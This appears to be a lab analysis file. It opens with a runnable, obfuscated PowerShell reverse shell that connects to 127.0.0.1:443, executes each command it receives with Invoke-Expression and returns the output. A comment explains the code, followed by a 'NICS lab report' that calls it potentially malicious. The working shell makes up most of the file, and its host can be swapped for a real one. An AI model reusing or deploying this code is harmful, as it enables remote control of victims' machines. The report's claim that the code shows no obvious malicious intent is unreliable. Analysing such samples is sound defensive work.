$client = NeW-OBjeCt S""yST""Em.nEt.S""OcK""etS.T""C""P""Cli""ent("127.0.0.1",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName Sys""tem.Text.ASC""IIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()


# ***********************************************************************************************
# The code establishes a reverse shell connection to an IP address and port specified as 
# "127.0.0.1" and "443" respectively. It creates  a TCP client object and gets the stream 
# associated with it. It then enters a loop where it reads data from the stream, executes 
# the received data as a command using the "iex" (Invoke-Expression) cmdlet, captures the 
# output of the command, appends it with the current working directory path, and sends it
# back to the remote server. The loop continues until there is no more data to read from
# the stream. Finally, the script closes the client connection.

# ----------------
# NICS lab report
# ----------------
# Although the code does not contain any obvious malicious intent, the use of obfuscation
# techniques and the establishment of a reverse shell connection can be indicative of
# potentially malicious activity. Further investigation is recommended to determine the
# context and purpose of this code.
# ***********************************************************************************************